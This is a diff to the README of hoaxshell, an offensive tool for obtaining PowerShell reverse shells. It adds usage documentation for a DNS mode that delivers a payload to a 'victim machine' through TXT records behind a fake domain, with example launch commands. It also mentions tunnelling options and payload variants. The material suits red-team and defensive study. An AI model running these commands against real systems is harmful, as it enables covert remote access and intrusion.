@@ -111,6 +111,37 @@ Use `-lt` or `--localtunnel` for LocalTunnel server
 sudo python3 hoaxshell.py -lt
 ```
 
+### Using a self-hosted DNS server, transmit the payload via fake domain
+
+Use `-dns` or `--dns-server` to start a **DNS server** on port `53`. On the victim's computer, the DNS payload will be executed, and the chunks of **TXT** records will be received to construct the actual payload. The DNS server will also attempt to resolve the fake domain name provided with the `-d` argument and will return the fake/false information. This way, you can use a fake domain name to transmit the payload to the victim machine. 
+
+Use `-dns` or `--dns-server` to start the server.
+There are some required arguments for this mode:
+
+| Argument | Description |
+| --- | --- |
+| `-s` / `--server-ip` | Your server IP |
+|`-d` / `--domain` | The fake domain name to be used. |
+|`-udp` / `--udp` | The UDP based server to be used for DNS queries. |
+|`-tcp` / `--tcp` | The TCP based server to be used for DNS queries. |
+
+#### **Examples:**
+For UDP based DNS server:
+```
+sudo python3 hoaxshell.py -s <your_ip> -dns -d <your.fake-domain.com> -udp 
+```
+For TCP based DNS server:
+```
+sudo python3 hoaxshell.py -s <your_ip> -dns -d <your.fake-domain.com> -tcp 
+```
+For both UDP and TCP based DNS servers at a time:
+```
+sudo python3 hoaxshell.py -s <your_ip> -dns -d <your.fake-domain.com> -udp -tcp 
+```
+
+***Note:** Due to the limitation that PowerShell's `Resolve-DnsName` cmdlet does not support custom ports. This feature will only work if you have port **53** open on your server. Therefore, you cannot use it with any tunneling option. (`-lt` or `-ng`)*
+
+
 ## Limitations
 The shell is going to hang if you execute a command that initiates an interactive session. Example:  
 ```
@@ -149,6 +180,7 @@ Some awesome people were kind enough to send me/publish PoC videos of executing 
 
 
 ## News
+- `2022-10-24` - Added `-dns` option to start a self-hosted **DNS server** that will serve the payload to the victim's machine using DNS resolution. This way, you can use a fake domain name to transmit the payload to the victim machine.
  - `13/10/2022` - Added constraint language mode support (-cm) option.
  - `08/10/2022` - Added the `-ng` and `-lt` options that generate PS payloads for obtaining sessions using tunnelling tools **ngrok** or **localtunnel** in order to get around limitations like Static IP addresses and Port-Forwarding.  
  - `06/09/2022` - A new payload was added that writes the commands to be executed in a file instead of utilizing `Invoke-Expression`. To use this, the user must provide a .ps1 file name (absolute path) on the victim machine using the `-x` option.  
